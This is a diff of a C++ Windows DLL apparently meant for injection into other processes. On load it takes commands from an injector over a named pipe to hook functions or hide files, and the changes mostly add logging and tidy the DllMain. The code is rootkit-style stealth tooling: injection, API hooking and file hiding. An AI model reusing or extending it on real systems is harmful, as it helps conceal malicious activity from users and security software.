@@ -1,22 +1,22 @@
-#include <iostream>
-#include "libPipe.h"
-#include <detours.h>
-using namespace std;
+#include "FileHiding.h"
+
 extern int hideFile(const string&);
 
 string global_function = {0};
-Pipe* glob_pipe;
+
 BOOLEAN flag = FALSE;
 
+Pipe* glob_pipe;
 extern "C" LPVOID glob_pointer = nullptr;
 extern "C" void AsmHook();
 extern "C" VOID hookCallback()
 {
-	glob_pipe->sendMessage("CALLED " + global_function);
+	glob_pipe->sendMessage(global_function);
 }
 
 BOOL pipeHandler()
 {
+	LOG("Dll_log");
 	int recv = 0;
 	string task;
 	Pipe *pipe = new Pipe(PIPE_NAME);
@@ -24,18 +24,17 @@ BOOL pipeHandler()
 	string command;
 	string func;
 	string file;
-	// Opening the existing pipe and receiving task from injector
 
 	try
 	{
 		pipe->openNamedPipe();
-
+		
 		LOGMSG("[OK] :: Pipe has been opened");
 
 		while (true)
 		{
 			recv = pipe->receiveMessage(task);
-			if (0 != recv)
+			if (recv != 0)
 			{
 				break;
 			}
@@ -46,7 +45,7 @@ BOOL pipeHandler()
 	}
 	catch (string error)
 	{
-		LOGMSG("[ERROR] Can't work with named pipe from dll :: " + error);
+		LOGMSG("[ERROR] :: Can't work with named pipe from dll :: " + error);
 		return FALSE;
 	}
 
@@ -89,11 +88,14 @@ BOOL pipeHandler()
 	else if ("-hide" == command)
 	{
 		file = task.substr(6, task.length());
+		LOGMSG("[!] From DllHook, before hideFile :: " + file);
 		hideFile(file);
+		LOGMSG("[!!!] After hideFile" );
 		delete pipe;
 	}
 	else
 	{
+		MessageBox(NULL, "not ok", command.c_str(), MB_OK);
 		return FALSE;
 	}
 
@@ -101,29 +103,21 @@ BOOL pipeHandler()
 }
 
 
-//DllMain
 BOOL WINAPI DllMain(
-	HINSTANCE hinstDLL,  // handle to DLL module
-	DWORD fdwReason,     // reason for calling function
-	LPVOID lpReserved)  // reserved
+	HINSTANCE hinstDLL,
+	DWORD fdwReason,
+	LPVOID lpReserved)
 {
-
-	switch (fdwReason)
+	LOG("Dll_log");
+	if (fdwReason == DLL_PROCESS_ATTACH)
 	{
-	case DLL_PROCESS_ATTACH:
 		LOGMSG("[!] :: Process attach");
 		DisableThreadLibraryCalls(hinstDLL);
 		if (!pipeHandler())
 		{
 			return FALSE;
 		}
-		break;
-		
-	case DLL_PROCESS_DETACH:
-		LOGMSG("[!] :: Process detach");
-		break;
 	}
 	
 	return TRUE;
-	
 }
